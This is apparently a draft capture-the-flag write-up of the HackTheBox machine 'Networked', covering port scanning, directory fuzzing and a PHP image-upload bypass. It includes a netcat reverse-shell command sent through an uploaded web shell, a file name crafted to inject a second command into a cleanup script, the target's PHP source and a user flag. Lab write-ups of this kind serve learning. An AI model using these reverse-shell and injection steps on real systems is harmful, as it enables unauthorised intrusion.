---
title: "Networked - HackTheBox"
date: 2019-09-15T17:03:11+02:00
draft: true
---
### Information gathering

Let's start with the usual nmap scan:
```
$ nmap -A -T4 10.10.10.146
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-22 00:48 EDT
Nmap scan report for 10.10.10.146
Host is up (0.051s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.57 second
```

This is the web page content:
```html
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```

```
$ ffuf -w raft-medium-files.txt -r -u http://10.10.10.146/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v0.11git
________________________________________________

 :: Method       : GET
 :: URL          : http://10.10.10.146/FUZZ
 :: Matcher      : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 211, Words: 15]
.                       [Status: 200, Size: 229, Words: 33]
upload.php              [Status: 200, Size: 169, Words: 11]
.html                   [Status: 403, Size: 207, Words: 15]
photos.php              [Status: 200, Size: 1302, Words: 68]
.htpasswd               [Status: 403, Size: 211, Words: 15]
index.php               [Status: 200, Size: 229, Words: 33]
.htm                    [Status: 403, Size: 206, Words: 15]
.htpasswds              [Status: 403, Size: 212, Words: 15]
.htgroup                [Status: 403, Size: 210, Words: 15]
.htaccess.bak           [Status: 403, Size: 215, Words: 15]
lib.php                 [Status: 200, Size: 0, Words: 1]
.htuser                 [Status: 403, Size: 209, Words: 15]
.ht                     [Status: 403, Size: 205, Words: 15]
.htc                    [Status: 403, Size: 206, Words: 15]
:: Progress: [17128/17128] :: 105 req/sec :: Duration: [0:02:43] :: Errors: 240 ::
```
![](/images/hackthebox/networked/ffuf2.png)
![](/images/hackthebox/networked/ffuf.png)
upload.php doesn't work

![](/images/hackthebox/networked/backuptar.png)

![](/images/hackthebox/networked/uploaded.png)

![](/images/hackthebox/networked/exiftool.png)
![](/images/hackthebox/networked/phpjpg.png)
![](/images/hackthebox/networked/cmd.png)
```
http://10.10.10.146/uploads/10_10_14_11.php.jpg?cmd=nc 10.10.14.11 1337 -e
/bin/bash
```
![](/images/hackthebox/networked/shell.png)
![](/images/hackthebox/networked/gulyhome.png)

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
  $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

```bash
$ touch \;nc\ 10\.10\.14\.25\ 1337\ -c\ bash
```

![](/images/hackthebox/networked/checkattack.png)
![](/images/hackthebox/networked/usershell.png)
![](/images/hackthebox/networked/user.png)

# User flag
```
526cfc2305f17faaacecf212c57d71c5
```

```php
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}


?>
```
